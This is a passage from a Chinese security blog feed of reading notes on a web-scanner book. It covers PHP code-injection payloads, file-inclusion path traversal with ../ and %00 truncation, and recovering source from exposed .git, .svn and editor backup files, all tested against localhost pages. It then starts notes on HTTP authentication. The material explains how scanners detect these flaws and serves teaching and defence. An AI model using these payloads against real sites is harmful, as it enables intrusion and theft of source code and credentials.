href="http://localhost/book/cmd/3_cmd.php?data=test;${print(md5(imiyoo)" target="_blank" rel="noopener">http://localhost/book/cmd/3_cmd.php?data=test;${print(md5(imiyoo)</a>) }。</p><p><strong>测试效果如下：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F98.png" alt="此处输入图片的描述"></p><h6 id="场景四："><a href="#场景四：" class="headerlink" title="场景四："></a><strong>场景四：</strong></h6><p>用户的输入以单引号或双引号的形式赋值给某个变量。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F99.png" alt="此处输入图片的描述"><br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F100.png" alt="此处输入图片的描述"></p><p>由于变量在单引号里面，<strong>因此需要先将两边的单引号闭合</strong>，然后用<strong>分号来分割语</strong>句，这样就能执行PHP代码了，构造输入如下。</p><p><strong>前端输入：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F101.png" alt="此处输入图片的描述"></p><p>访问链接 <a href="http://localhost/book/cmd/4_cmd.php?data=" target="_blank" rel="noopener">http://localhost/book/cmd/4_cmd.php?data=</a> test’;${print(md5(imiyoo)) };’.</p><p><strong>测试效果如下：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F102.png" alt="此处输入图片的描述"></p><h6 id="场景五："><a href="#场景五：" class="headerlink" title="场景五："></a><strong>场景五：</strong></h6><p>将用户的输入作为数组的key进行赋值。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F103.png" alt="此处输入图片的描述"></p><p>这里前端输入的变量作为数组的key, <strong>为了执行代码， 需要从key的位置中跳出来</strong>，因此可以通过下面的形式进行闭合， 构造如下语句。</p><p><strong>前端输入：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F104.png" alt="此处输入图片的描述"></p><p>访问链接 <a href="http://localhost/book/cmd/5_cmd.php?data=test&quot;]=" target="_blank" rel="noopener">http://localhost/book/cmd/5_cmd.php?data=test&quot;]=</a> 1;$ {print(md5(imiyoo))};//</p><p><strong>测试效果如下：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F105.png" alt="此处输入图片的描述"></p><h5 id="3-检测原理"><a href="#3-检测原理" class="headerlink" title="3.检测原理"></a><strong>3.检测原理</strong></h5><p>下面讲一下命令执行注入的检测原理。</p><p>首先，需要结合漏洞的场景，<strong>对原有的语旬逻辑进行闭合</strong>。<br>然后，通过特性字符或特性用法<strong>注入有预期输出的命令语句</strong>。<br>最后，根据响应<strong>输出的内容进行漏洞判定</strong>。</p><p>如果目标存在命令注入执行漏洞，那么预期的内容就会显性地输出到页面。 同理，如果目标不存在该漏洞，那么页面就不会出现预期的内容。</p><p>下面构造该漏洞对应的扫描载荷，将命令执行注入漏洞的场景及检测数据整理如下表：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F106.png" alt="此处输入图片的描述"></p><p>该漏洞场景实质上<strong>覆盖了两类情况</strong>： 一类是<strong>系统层面的命令执行</strong>；另一类是<strong>应用层面的命令执行</strong>。</p><p>由于它们的命令特征函数并不相同，因此可以分类对其进行检测。根据上面的检测原理和对应的扫描载荷， 来实现针对命令执行注入漏洞的检测， </p><p><strong>部分代码如下：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F107.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F108.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F109.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F110.png" alt="此处输入图片的描述"></p><h4 id="4-文件包含漏洞"><a href="#4-文件包含漏洞" class="headerlink" title="(4)文件包含漏洞"></a><strong>(4)文件包含漏洞</strong></h4><h5 id="1-漏洞的分类"><a href="#1-漏洞的分类" class="headerlink" title="1.漏洞的分类"></a><strong>1.漏洞的分类</strong></h5><p>分为远程文件包含合本地文件包含，本质上是一样的(当然在 PHP 的设置上有些不同)，本书只介绍本地文件包含漏洞</p><h5 id="2-漏洞利用场景"><a href="#2-漏洞利用场景" class="headerlink" title="2.漏洞利用场景"></a><strong>2.漏洞利用场景</strong></h5><h6 id="场景一："><a href="#场景一：" class="headerlink" title="场景一："></a><strong>场景一：</strong></h6><p>将前端获取的变量直接传递给文件包含函数。</p><p><strong>后端代码：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F111.png" alt="此处输入图片的描述"></p><p>这里将前端获取的文件名直接传递到文件包含函数中，<strong>中间没有任何过滤</strong>，因此我们可以控制包含的文件名变最。当前端输入如下的内容：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F112.png" alt="此处输入图片的描述"></p><p>那么就可以直接读取 Linux 系统中的账号和密码文件了(当然这个文件的是普通用户可以读的，不能说明权限问题，另外如果可能还会受到 open_basedir 的路径限制，下面我们会说到)， 如下图：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F113.png" alt="此处输入图片的描述"></p><p>但在实际的测试中，像lnmp这种一键集成环境部署工具本身就已做过一些安全加固措施，在网站的根目录下会有一个 .user.ini 隐藏文件，会限定文件的读取目录，内容如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F114.png" alt="此处输入图片的描述"></p><p>因此，我们只能在限定路径内去寻找有预期输出的文件进行漏洞判定。<strong>针对当前的环境，有下面两种方式：</strong></p><p><strong>方法一：</strong></p><p>利用/proc/ 目录下的文件， Linux 内核提供了一种通过/proc文件系统，<strong>在运行时访问内核内部数据结构、 改变内核设置的机制</strong>。它以文件系统的方式为访问系统内核数据的操作提供接口，用户和应用程序可以通过proc得到系统的信息。该目录下可作为预期输出的文件，如下表：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F115.png" alt="此处输入图片的描述"></p><p><strong>方法二：</strong></p><p><strong>有针对性地去找一些系统默认的配置文件和隐藏文件</strong>，比如，在当前的lnmp环境下，可以通过隐藏文件.user.ini进行漏洞检测和判定。为了描述简单和易于理解， 这里用第一种方法进行语句构造。</p><p><strong>前端输入：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F116.png" alt="此处输入图片的描述"></p><p>访问链接： <a href="http://localhost/book/lfi/1_lfi.php?data=/proc/meminfo" target="_blank" rel="noopener">http://localhost/book/lfi/1_lfi.php?data=/proc/meminfo</a></p><p><strong>测试效果如下：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F117.png" alt="此处输入图片的描述"></p><h6 id="场景二-1"><a href="#场景二-1" class="headerlink" title="场景二"></a><strong>场景二</strong></h6><p>将前端获取的变量名通过<strong>拼接目录名</strong>，直接传递给文件包含函数。</p><p><strong>后端代码：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F118.png" alt="此处输入图片的描述"></p><p>代码中的文件名前面还有目录名，程序员本来是想只允许包含该目录下的文件，但由于这里并没有任何限制， 因此， <strong>可以利用目录跳转”../“进行突破</strong>， 跳出当前所在的目录， 这样就又可以包含任意文件了。 </p><p>由于这里并不知道上级目录的级数，没有合适的参考路径，所以<strong>需要用多级目录跳转</strong>，直至根目录，然后从根目录开始选择有预期输出的文件， 因此构造如下的语句。</p><p><strong>前端输入：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F119.png" alt="此处输入图片的描述"></p><p>访问链接 <a href="http://localhost/book/lfi/2_lfi.php?data=../../../../../../../../../../proc/meminfo" target="_blank" rel="noopener">http://localhost/book/lfi/2_lfi.php?data=../../../../../../../../../../proc/meminfo</a> </p><p><strong>测试效果如下图：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F120.png" alt="此处输入图片的描述"></p><h6 id="场景三-1"><a href="#场景三-1" class="headerlink" title="场景三"></a><strong>场景三</strong></h6><p>将前端获取的变量通过<strong>拼接扩展名</strong>，然后直接传递给文件包含函数。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F121.png" alt="此处输入图片的描述"></p><p>这里程序<strong>限制了文件的扩展名</strong>，由于只能包含特定扩展名的文件，<strong>这样就不能包含有预期输出的文件了</strong>，所以也就无法进行正常的检测。但是可以<strong>利用字符串截断的特性进行突破</strong>：</p><p><strong>%00截断</strong></p><p>十六进制0X00是字符串结束的标志。如果是字符串类型，在遇到0X00时就会截断，其后的字节不会再作为字符串的内容。这样就可以利用0X00来截断后面的扩展名，从而可以包含任意文件。<strong>%00是0X00在URL中的表现</strong>形式，因此可以构造如下的语句进行检测：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F121.png" alt="此处输入图片的描述"></p><p><strong>长度截断</strong></p><p>通常Windows的截断长度为240, Linux的截断长度为4096<strong>。由于Windows和Linux的文件名都有一个最大路径长度(MAX]ATH)的限制</strong>，因此当提交文件名的长度超过了最大路径长度的限制时就会截断后面的内容，从而可以无障碍地包含任意文件。</p><p>在实际的测试中， 可以用一定数最的字符”.”、”/“或者”./“来突破操作系统对文件名的最大长度限制，截断后面的字符串。</p><blockquote><p><strong>注意：</strong><br>%00截断和长度截断在PHP5.4以上版本都已经修复，因此在测试环境中并不能重现，但这也是一种攻击的重要思路，依然需要重点掌握。</p></blockquote><p>文件包含漏洞的检测其实相对简单， 因为它有非常明显的输入和输出，<strong>所以只需要根据不同的漏洞场景，通过构造语句读取有预期输出的文件，然后通过相应的特征匹配， 就可以实现漏洞检测</strong>。如果目标存在漏洞， 那么对应的文件就会被读取，而文件中的内容也会被输出到响应页面中，这样就可以根据文件的内容特征进行匹配， 从而进行后续的漏洞判定。</p><p><strong>扫描载荷的情况如下表：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F123.png" alt="此处输入图片的描述"></p><p>在文件包含的检测中，经常会碰到一种情况：<strong>在原始响应页面中就存在特征内容， 这样就会造成明显的误报，</strong> 因此需要<strong>先对原始请求的内容进行预判，然后再进行对应的漏洞检测</strong>。具<br>体的核心检测代码如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F124.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F125.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F126.png" alt="此处输入图片的描述"></p><p>这里面的函数书写模式和之前的其他漏洞的检测模式基本一样，这里就不再多解释了</p><h4 id="5-敏感文件泄露"><a href="#5-敏感文件泄露" class="headerlink" title="(5)敏感文件泄露"></a><strong>(5)敏感文件泄露</strong></h4><h5 id="1-概念以及原理"><a href="#1-概念以及原理" class="headerlink" title="1.概念以及原理"></a><strong>1.概念以及原理</strong></h5><p>敏感文件泄露主要由于人为的疏忽或工具的特性等原因所致。由于没有技术含量，所以经常不被人重视。但它却最容易导致服务器被攻击和入侵，攻击者利用这些细节可以有效地探测到敏感文件信息，而这些敏感文件通常包含账号、密码等重要信息，然后利用这些账号信息访问未授权系统实现进一步攻击，从而完成最终的入侵和数据窃取。</p><h5 id="2-敏感文件泄露漏洞场景"><a href="#2-敏感文件泄露漏洞场景" class="headerlink" title="2.敏感文件泄露漏洞场景"></a><strong>2.敏感文件泄露漏洞场景</strong></h5><h6 id="场景一-1"><a href="#场景一-1" class="headerlink" title="场景一"></a><strong>场景一</strong></h6><p>管理员为了对网站数据进行备份，直接对网站目录下的所有文件打包，并将其存放在网站的web根目录下。同时为了简单易记通常会将其命名如：wwwroot.rar、wwwroot.zip、1.zip、w.zip、bak.zip等，而网站目录中的这些文件，在没有额外控制策略的情况下，任何人都可以直接访问和下载</p><h6 id="场景二-2"><a href="#场景二-2" class="headerlink" title="场景二"></a><strong>场景二</strong></h6><p>开发人员在使用版本控制工具（如： GIT、SVN、CVS等）进行项目部署时，没有删除根目录下的隐藏备份文件。攻击者利用这些文件可换取项目源代码或配置文件等敏感信息， 从而完成后续的攻击和入侵。</p><p><strong>SVN敏感信息泄露</strong></p><p>SVN (Subversion)是一个自由、 开源的项目<strong>源代码版本控制工具</strong>。 目前，绝大多数开源软件和企业代码管理， 都使用SVN作为代码版本管理软件。 开发人员使用”svn checkout” 来检出项目代码时， 在项目根目录下会有一个隐藏目录.svn, 内容如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F127.png" alt="此处输入图片的描述"></p><p>其中， 项目源码文件都备份在pristine目录下，we.db是一个SQLite数据库文件，里面记录着项目源码文件在pristine目录下的对应路径，可以通过下面命令获取：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F128.png" alt="此处输入图片的描述"></p><p>而对于SVN的1.6.X及以下版本，则可以通过对.svn隐藏目录中的entries文件进行解析，这样就可以获取项目源码的目录结构和文件内容。entries文件的解析也非常简单， 如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F129.png" alt="此处输入图片的描述"></p><blockquote><p><strong>注意：</strong><br>SVN的1.6.X及以下版本是在每个文件夹都生成一个.svn隐藏文件夹，而SVN的1.7.X版只在版本库根目录下生成一个.svn隐藏文件夹，当给线上环境进行项目部署时，需要删除svn隐藏目录，或使用svn export进行项目部署； 也可以在服务器上进行配置 ，禁止访问.svn目录</p></blockquote><p><strong>Git敏感信息泄露</strong></p><p>Git是一款免费、开源的<strong>分布式版本控制系统</strong>，用于敏捷高效地处理任何或小或大的项目。很多企业也会选择使用它作为代码版本控制<strong>。当使用git clone进行线上项目部署时</strong>，git会把项目的信息隐藏在一个.git的文件夹里， 如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F130.png" alt="此处输入图片的描述"></p><p>其中，index文件实际上是一个包含文件索引的目录树，它记录了文件名、文件内容的SHA1哈希值和文件访问权限。ojbects目录中存放着所有Git对象，也包含项目源码的备份文件。通过对index文件进行解析，就能找到源文件在objects目录的对应关系，从而获取对应的源文件内容。</p><p>可以用git ls-files — stage命令来解析index文件， 如下</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F131.png" alt="此处输入图片的描述"></p><p>备份文件对象在objects目录的存储原则为： SHA1 哈希值的前两位是文件夹名称， 后38<br>位作为对象文件名。比如，上图中README.md的文件SHA1哈希值为：adeb458def7e52e3ablb4ac586ac49ef49c5b373, 那么对应的文件路径则为：objects/ad/eb458def7e52e3abl4ac586ac49ef49c5b373, 两个文件的内容是 致的， 如下</p><p><strong>查看备份文件的内容：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F132.png" alt="此处输入图片的描述"></p><p>在Git系统中， 备份文件对象有两种存储方式， <strong>一种是松散对象存储</strong>， 就是前面提到的；另一种是<strong>打包对象存储</strong>， 它会对松散对象中的文件进行打包存储，此时objects的目录结构如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F133.png" alt="此处输入图片的描述"></p><p>如果要想获取项目源文件信息，那么需要先对其进行解包，然后按照松散对象的方式来获取，解包的具体操作方式如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F134.png" alt="此处输入图片的描述"></p><p>至于打包文件的文件名，可以从 objects/info/packs 中获取，当使用 git gc 命令对松散对象进行打包时， 会在 objects/info/packs 文件中记录打包对象的文件名信息.</p><h6 id="场景三-2"><a href="#场景三-2" class="headerlink" title="场景三"></a><strong>场景三</strong></h6><p>如果开发人员在线上环境<strong>临时修改代码</strong>， 那么一些编辑工具会自动产生对应的备份文件，一旦疏忽， Web目录中就会留下.bak 、.swp 、.old 或～等扩展名的备份文件，特别是一些数据库配置文件。攻击者可以根据这个特性探测和获取目标的敏感信息</p><p>比如， Linux 下常用的编辑器Vi, 其特性为：当使用Vi 打开一个文件时，在同目录下会生成一个swp扩展名的隐藏文件，它主要起到临时备份和还原的作用。如果文件正常退出， 那么这个文件会自动删除， 没有影响；但如果文件异常退出或处正在于编辑时，那么这个文件就会持续存在。此时攻击者就可以下载该文件来获取敏感信息， 如下图：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F135.png" alt="此处输入图片的描述"></p><p>然后通过vi -r即可恢复</p><h5 id="3-敏感文件泄露的检测原理"><a href="#3-敏感文件泄露的检测原理" class="headerlink" title="3.敏感文件泄露的检测原理"></a><strong>3.敏感文件泄露的检测原理</strong></h5><h6 id="1-压缩、备份类文件检测"><a href="#1-压缩、备份类文件检测" class="headerlink" title="1.压缩、备份类文件检测"></a><strong>1.压缩、备份类文件检测</strong></h6><p>对于压缩类的文件检测，只需要构造文件对应的 URL, 然后向目标请求该 URL. <strong>根据HTTP响应中的状态码及文件类型进行判断</strong>。 在这里其实并不需要获取 HTTP 响应中的响应体信息， <strong>只要通过响应头的 Content-type 字段的值即可判断</strong>。 为了提高检测效率 可以使用 HTTP 请求中的<strong>HEAD方法进行快速处理</strong>；而对于备份类的文件检测， 只需要关注动态脚本文件，并根据脚本语言的源码特征进行检测即可。</p><h6 id="2-版本类文件检测"><a href="#2-版本类文件检测" class="headerlink" title="2.版本类文件检测"></a><strong>2.版本类文件检测</strong></h6><p>版本类文件的检测， 可以根据特征文件的Content-type进行判断。 对于SVNl.6.X及以下的版本，可以通过.svn/entries文件进行检测：对千SVNl.7.X以上的版本，可以通过.svn/wc.db 文件进行检测；对千Git敏感文件泄露， 可以根据.git/index这个文件进行检测。这些文件都属千二进制流文件， 因此其Content-type类型都是application/octet-stream。</p><p>在敏感文件的检测中， 会对常见的压缩文件、 备份文件和版本文件进行探测和验证，查看目标是否存在敏感文件泄露， </p><p><strong>代码实现：</strong></p><p><strong>压缩、 备份类文件检测的部分检测代码如下</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F136.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F137.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F138.png" alt="此处输入图片的描述"></p><p><strong>版本类文件检测的部分检测代码如下：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F139.png" alt="此处输入图片的描述"></p><h2 id="0X06-参考链接"><a href="#0X06-参考链接" class="headerlink" title="0X06 参考链接"></a><strong>0X06 参考链接</strong></h2><p><a href="http://yuedu.163.com/book_reader/cc457ea1464d4bb6bd27a2082658a434_4/b517da182e6b4c119de3eca5f3891c91_4" target="_blank" rel="noopener">http://yuedu.163.com/book_reader/cc457ea1464d4bb6bd27a2082658a434_4/b517da182e6b4c119de3eca5f3891c91_4</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0X04-应用指纹识别&quot;&gt;&lt;a href=&quot;#0X04-应用指纹识别&quot; class=&quot;headerlink&quot; title=&quot;0X04 应用指纹识别&quot;&gt;&lt;/a&gt;&lt;strong&gt;0X04 应用指纹识别&lt;/strong&gt;&lt;/h2&gt;&lt;h3 id=&quot;1-概念&quot;&gt;&lt;a href=&quot;#1-概念&quot; class=&quot;headerlink&quot; title=&quot;1.概念&quot;&gt;&lt;/a&gt;&lt;strong&gt;1.概念&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;应用指纹，其实&lt;strong&gt;是Web 应用的一种身份标识&lt;/strong&gt;，具有唯一性。在Web 应用的开发过程中，为了提高开发的效率和系统的稳定性，通常会用到一些成熟、稳定的第三方环境、程序、框架或服务等，而&lt;strong&gt;这些第三方内容的名称或标识就是这里所说的应用指纹。&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&quot;2-应用指纹种类及识别&quot;&gt;&lt;a href=&quot;#2-应用指纹种类及识别&quot; class=&quot;headerlink&quot; title=&quot;2.应用指纹种类及识别&quot;&gt;&lt;/a&gt;&lt;strong&gt;2.应用指纹种类及识别&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;对于一个简单的Web 应用而言，它所涉及的应用指纹信息非常多，这里为了便于理解和记忆，我们根据网络数据的流向，并结合分层思想，&lt;strong&gt;将常见的应用指纹分成了5 类&lt;/strong&gt;， 如下：&lt;/p&gt;
    
    </summary>
    
      <category term="备忘" scheme="https://www.k0rz3n.com/categories/%E5%A4%87%E5%BF%98/"/>
    
    
      <category term="备忘" scheme="https://www.k0rz3n.com/tags/%E5%A4%87%E5%BF%98/"/>
    
  </entry>
  
  <entry>
    <title>《白帽子讲 web 扫描》 阅读记录(上)</title>
    <link href="https://www.k0rz3n.com/2019/03/03/%E3%80%8A%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2%20web%20%E6%89%AB%E6%8F%8F%E3%80%8B%20%E9%98%85%E8%AF%BB%E8%AE%B0%E5%BD%95(%E4%B8%8A)/"/>
    <id>https://www.k0rz3n.com/2019/03/03/《白帽子讲 web 扫描》 阅读记录(上)/</id>
    <published>2019-03-03T07:02:18.000Z</published>
    <updated>2019-04-28T13:56:30.521Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>目前市面上有关扫描器的书籍大概就是这本 《白帽子讲 web 扫描》了，虽然知道区区 200 多页的书籍内容的深度和广度不会很高，但是还是介绍了一些开发扫描器过程中的基本方法和关键的坑点，对于我这种初学者也算是一本不错的入门级教材了，本文是阅读这本书的读书记录，作为备忘。</p><h2 id="0X01-如何理解扫描器"><a href="#0X01-如何理解扫描器" class="headerlink" title="0X01 如何理解扫描器"></a><strong>0X01 如何理解扫描器</strong></h2><h3 id="1-概念以及原理"><a href="#1-概念以及原理" class="headerlink" title="1.概念以及原理"></a><strong>1.概念以及原理</strong></h3><p>Web 扫描器其实是一种<strong>自动化</strong>的安全弱点和风险检测工具：它的工作方式和原理主要是<strong>通过分析HTTP (s) 请求和响应</strong>来发现安全问题和风险</p><a id="more"></a><h3 id="2-作用以及目的"><a href="#2-作用以及目的" class="headerlink" title="2.作用以及目的"></a><strong>2.作用以及目的</strong></h3><p>在对一个目标进行渗透测试时，<strong>首先需要进行信息收集，然后再对这些信息进行漏洞审计</strong>。其中，<strong>信息收集</strong>的目的是最大化地收集与目标有关联的信息，<strong>提供尽可能多的攻击入口</strong>；<strong>漏洞审计</strong>则是对这些可能的攻击入口进行安全分析和检测， 来<strong>验证这些攻击入口是否可以被利用</strong>。 </p><p>由于这两个环节的工作更多是具有发散性的，因此人工的工作量就会非常大。 这个时候就我们需要用到Web扫描器，其实它的<strong>目的就是尽可能地帮助我们自动完成这两个环节，方便安全测 试人员快速获取目标可供利用的漏洞以便进行后续渗透工作。</strong></p><h3 id="3-扫描器的类型"><a href="#3-扫描器的类型" class="headerlink" title="3.扫描器的类型"></a><strong>3.扫描器的类型</strong></h3><h4 id="1-主动型"><a href="#1-主动型" class="headerlink" title="(1)主动型"></a><strong>(1)主动型</strong></h4><p>主动型的意思就是说，当对目标进行扫描时，<strong>扫描请求是主动发起的</strong>，所以称之为主动型，常见的有 AWVS Nessus 等</p><h4 id="2-被动型"><a href="#2-被动型" class="headerlink" title="(2)被动型"></a><strong>(2)被动型</strong></h4><p>不会向目标发送扫描请求，而是<strong>通过中间代理或流量镜像的方式</strong>，通过网络流量的真实请求去发现和告知可能存在的安全缺陷或漏洞。常见的有 GourdScan 和 NagaScan</p><h4 id="3-云端型"><a href="#3-云端型" class="headerlink" title="(3)云端型"></a><strong>(3)云端型</strong></h4><p>一些在线的扫描器，这里就不再列举了。</p><h2 id="0X02-爬虫基础"><a href="#0X02-爬虫基础" class="headerlink" title="0X02 爬虫基础"></a><strong>0X02 爬虫基础</strong></h2><h3 id="1-HTTP-认证"><a href="#1-HTTP-认证" class="headerlink" title="1.HTTP 认证"></a><strong>1.HTTP 认证</strong></h3><p>爬虫在爬取资源的过程中，有时候会遇到 HTTP 认证的情况，也就是说，Web 服务器会对客户端的权限进行认证，只有认证通过才允许其访问服务端的资源。</p><h4 id="1-Basic-认证"><a href="#1-Basic-认证" class="headerlink" title="(1) Basic 认证"></a><strong>(1) Basic 认证</strong></h4><p>Basic认证是HTTP常用的一种认证方式， 由于HTTP协议是无状态的， 所以客户端每次访问Web应用时，<strong>都要在请求的头部携带认证信息</strong>， 一般是用户名和密码， 如果验证不通过， 则会提示如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F1.png" alt="此处输入图片的描述"></p><p>Basic认证的请求和响应， 抓包如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F2.png" alt="此处输入图片的描述"></p><p>其中， HTTP请求中的Authorization字段包含着用户名和密码信息， Basic后面的一串字符：”YWRtaW46c2VjcmVO” 即为用户名和密码的 Base64 编码，解码后的内容为：admin:secret。</p><p>从上面的描述中，我们可以看到，Basic 认证的缺点很明显，<strong>它是按照明文信息进行传递的，因此很容易被中间人劫持获取。</strong></p><h4 id="2-Digest认证（摘要式）"><a href="#2-Digest认证（摘要式）" class="headerlink" title="(2) Digest认证（摘要式）"></a><strong>(2) Digest认证（摘要式）</strong></h4><p>Digest 认证其实是一种基于挑战－应答模式的认证模型，它比 Basic 更安全。为了防止重放攻击，客户端在发送第一个请求后，会受到一个状态码为 401 的响应，响应内容包含一个唯一的字符串 : nonce ,且每次请求返回的内容都不一样。摘要式认证过程需要两次交互来完成</p><h5 